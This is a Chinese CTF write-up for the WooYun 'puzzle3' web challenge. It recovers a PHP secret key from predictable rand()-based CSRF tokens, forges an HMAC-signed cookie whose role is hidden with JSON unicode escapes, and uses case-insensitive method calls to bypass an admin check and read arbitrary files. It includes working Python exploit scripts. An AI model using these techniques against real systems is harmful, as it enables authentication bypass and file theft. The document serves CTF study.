# 乌云puzzle3 思路记录总结 

## 0x00 线性同余算法计算随机数  

看懂这篇文章：[http://www.mscs.dal.ca/~selinger/random/](http://www.mscs.dal.ca/~selinger/random/)

关键点在：  

![](http://i.imgur.com/2ntvz5h.png)	

源码中先生成6位secret_key,再生成的随机token。我们可以逆向算一算：  

	o[i] = o[i+31] - o[i+28]


于是我们只要生成一个超过32位的随机数连续序列，就可以计算出前面的随机数token了。    
由于可能存在需要加1的情况，需要简单的爆破。    

首先用**同一个session**生成一段随机数序列：  

观察看到下列源码，发现每次csrf_token 用掉之后，会再次生成一个，于是可以多生成几个随机数序列。

	function check_csrf_token()
	{
	    if(empty($_SESSION['CSRF_TOKEN']) || $_POST['CSRF_TOKEN'] !== $_SESSION['CSRF_TOKEN']) {
	        return false;
	    } else {
	        $_SESSION['CSRF_TOKEN'] = null;
	        return true;
	    }
	}
	
python代码生成随机数序列为：  

	def get_csrf_serial(url):
	    csrf_serial = ""
	
	    for i in range(3):
	        resp = r.get(url)
	
	        csrf_token = get_csrf(r.get(url).text)
	        print csrf_token
	        csrf_serial += csrf_token
	        post_data = {"CSRF_TOKEN":csrf_token,"submit":"%E6%8F%90%E4%BA%A4"}
	        r.post(url,data = post_data)//消耗一个token，使其生成新的token
	
	    return csrf_serial


可以通过这个`csrf_serial`算出一个`secret_key`:  

	str_aaa = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	def cal_secret_key(csrf_serial):
	    secret_key = ""
	
	    for i in range(6):
	        index = (str_aaa.find(csrf_serial[31 + i - 6]) -str_aaa.find(csrf_serial[28 + i - 6]) + 62) % 62
	
	        secret_key += str_aaa[index]
	
	    return secret_key


然后就可以fuzz下每一位了，有可能减1，最终可以得到一个`PHPSESSION`和一个`secrect_key`，这样就可以进行下一步了。  


	def fuzz_secret_key(secret_key,url):
	    for r0  in range(2):
	        for r1 in range(2):
	            for r2 in range(2):
	                for r3 in range(2):
	                    for r4 in range(2):
	                        for r5 in range(2):
	
	                            new_secret_key = ""
	
	                            new_secret_key += str_aaa[(str_aaa.find(secret_key[0])-r0)%62]
	                            new_secret_key += str_aaa[(str_aaa.find(secret_key[1])-r1)%62]
	                            new_secret_key += str_aaa[(str_aaa.find(secret_key[2])-r2)%62]
	                            new_secret_key += str_aaa[(str_aaa.find(secret_key[3])-r3)%62]
	                            new_secret_key += str_aaa[(str_aaa.find(secret_key[4])-r4)%62]
	                            new_secret_key += str_aaa[(str_aaa.find(secret_key[5])-r5)%62]
	
	                            print new_secret_key
	                            csrf_token = get_csrf(r.get(url).text)
	
	                            key_md5 = hash_mac_md5("flag",new_secret_key)
	                            print key_md5
	                            post_data = {"act":"flag", "CSRF_TOKEN":csrf_token,"submit":"%E6%8F%90%E4%BA%A4", "key": key_md5}
	                            resppp = r.post(url,data = post_data)
	                            #print resppp.text
	                            #print r.cookies
	                            if  "Permission deny" not in resppp.text:
	                                print resppp.text
	                                print r.cookies
	                                print new_secret_key
	                                exit();     

这里用到了`hmac`加密，算法在python中同样实现为：  

	def hash_mac_md5(data, key):
	    #print key
	    digest_maker = hmac.new(key)
	    digest_maker.update(data)
	    return digest_maker.hexdigest()



## 0x01 json utf-8 编码绕过检测  


得到`secret_key`后，可以执行一个任意命令，但是必须是无参的：  

	if(hash_hmac('md5', $act, $_SESSION['SECRET_KEY']) === $key) {
        if(function_exists($act)) {
            $exec_res = $act();
            output($exec_res);
        } else {
            show_error_page("Function not found!!");
        }
    } else {
        show_error_page("Permission deny!!");
    }

这里使用`get_defined_functions`函数，得到自定义函数：  

注意： 加上X-Requested-With : XMLHttpRequest 头，才能得到json输出数据。  

	"user"["rand_str","output","check_csrf_token","show_form_page","show_error_page","_fd_init","fd_show_source","fd_config","fd_error","fg_safebox"]   

有个`fd_show_show_source`函数，执行可以得到`flag.php`源码:  


	class SafeBox {
	
	    private function _read_file($filename)
	    {
	        $filename = dirname(__FILE__) . "/" . $filename;
	        return file($filename);
	    }
	
	    public function read()
	    {
	        $filename = isset($_POST['filename']) ? $_POST['filename'] : "box.txt";
	        return $this->_read_file($filename);
	    }
	
	    public function view()
	    {
	        $lines = $this->_read_file('box.txt');
	        $i = isset($_POST['i']) ? intval($_POST['i']) : 0;
	        return isset($lines[$i]) ? $lines[$i] : "None";
	    }
	
	    public function alist()
	    {
	        $lines = $this->_read_file('box.txt');
	        return $lines;
	    }
	
	    public function random()
	    {
	        $lines = $this->_read_file('box.txt');
	        return $lines[array_rand($lines)];
	    }
	}
	
	function _fd_init()
	{
	    //定义role必须为guest
	    $_SESSION["userinfo"] = [
	        "role" => "guest"
	    ];
	    $cookie = isset($_COOKIE['userinfo']) ? base64_decode($_COOKIE['userinfo']) : "";
	    
	    var_dump($cookie);
	    if(empty($cookie) || strlen($cookie) < 32) {
	        return false;
	    }
	    
	    $h1 = substr($cookie, 0, 32);
	    $h2 = substr($cookie, 32);
	    var_dump($h2);
	    if($h1 !== hash_hmac("md5", $h2, $_SESSION['SECRET_KEY'])) {
	        return false;
	    }
	    
	    //防止身份伪造
	    if(strpos($h2, "admin") !== false || strpos($h2, "user") !== false) {
	        return false;
	    }
	    
	    
	    $s = json_decode($h2, true);//返回array, json数据解析。
	    var_dump($s);
	    
	    $s['role'] = strval($s['role']);
	    if($s['role'] == 'admin') {
	        return false;
	    }
	    $_SESSION["userinfo"] = array_merge($_SESSION["userinfo"], $s);
	    return true;
	}
	
	function fd_show_source()
	{
	    return file_get_contents(__FILE__);
	}
	
	function fd_config()
	{
	    return include_once __DIR__ . "/config.php";
	}
	
	function fd_error($msg)
	{
	    return "Error: {$msg}";
	}
	
	function fg_safebox()
	{
	    _fd_init();
	    $config = fd_config();
	    $action = isset($_POST['method']) ? $_POST['method'] : "";
	    $role = isset($_SESSION["userinfo"]['role']) ? $_SESSION["userinfo"]['role'] : "";
	    if(!in_array($role, ['admin', 'user'])) {
	        return fd_error('Permission denied!!');
	    }
	    if(in_array($action, $config['role']['admin']) && $role != "admin") {
	        return fd_error('Admin permission denied!!');
	    }
	    $box = new SafeBox();
	    if(method_exists($box, $action)) {
	        return call_user_func([$box, $action]);
	    } else {
	        return null;
	    }
	}

目标很明确，绕过限制得到admin权限，想了半天，看懂代码。发现有个很奇怪的地方：  

	$s = json_decode($h2, true);
	$s['role'] = strval($s['role']);
    if($s['role'] == 'admin') {//没有判断是否为user
        return false;
    }      

这里就可以想象到可以使用json什么手段，绕过前面的检测。寻寻觅觅，发现json支持unicode编码，测试如下：  

	$user_json = "\"\\u0075\\u0073\\u0065\\u0072\"";//user 的utf-8编码  
	var_dump(json_decode($user_json));
	
	var_dump(strpos($admin_json,"user"));

程序输出：  

	string 'user' (length=4)

	boolean false


## 0x02 大小写绕过函数调用   

得到user权限后，还要绕过这么一句话：  

	if(in_array($action, $config['role']['admin']) && $role != "admin")   


这样才能调用`read`函数读取任意文件，整理思路：  

	in_array函数是大小写敏感的。

进一步想到：  

	call_user_func是否也是大小写敏感？  

于是测试了下：  

	$action = "Fd_show_source";
	var_dump(call_user_func($action));    

bingo~成功调用并输出代码。    


于是就成功绕过限制得到admin权限了，具体代码请查看github，关键点代码如下：  

	def construct_cookie(s_key):

	    h2 = "{\"role\":\"\\u0075\\u0073\\u0065\\u0072\"}"
	
	    print h2
	
	    h1 = hash_mac_md5(h2,s_key)
	
	    print base64.b64encode(h1 + h2)
	    return base64.b64encode(h1 + h2)
	
	def get_output_sanbox():
	
	    php_session = "i3gb61avgs9a342mmp2mhiqm91";
	    #act = "get_defined_functions"
	    act = "fg_safebox"
	    #act = "phpinfo"
	    new_secret_key = "y5QRaZ"
	
	    headers = {"Accept-Encoding": "gzip, deflate",
	                "Accept-Language": "en-US,en;q=0.5",
	                "Cookie":"PHPSESSID=" + php_session +";userinfo=" + construct_cookie(new_secret_key),
	                "X-Requested-With" : "XMLHttpRequest",
	                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
	                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}
	
	    url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
	    csrf_token = get_csrf(r.get(url,headers=headers).text)
	    key_md5 = hash_mac_md5(act,new_secret_key)
	    print key_md5
	    post_data = {"act":act, "CSRF_TOKEN":csrf_token,"submit":"%E6%8F%90%E4%BA%A4", "key": key_md5,"method":"Read","filename":"flag.php"}
	    resppp = r.post(url,headers=headers, data = post_data)
	    print resppp.text
	
## 0x03 说在最后  

在我做到这一步的时候，官方writeup出来了，有人已经做出来了。环境也随之关闭了~  
当时读了几个文件，没找到flag在哪，正想着多读几个配置文件，就关了~~  

看了writeup后，最后一起读了那么多linux配置文件然后得到结果，思路不错。  
贴上链接，mark~     
[https://www.91ri.org/7911.html](https://www.91ri.org/7911.html "https://www.91ri.org/7911.html")    

## 0x04 源码  





	
	
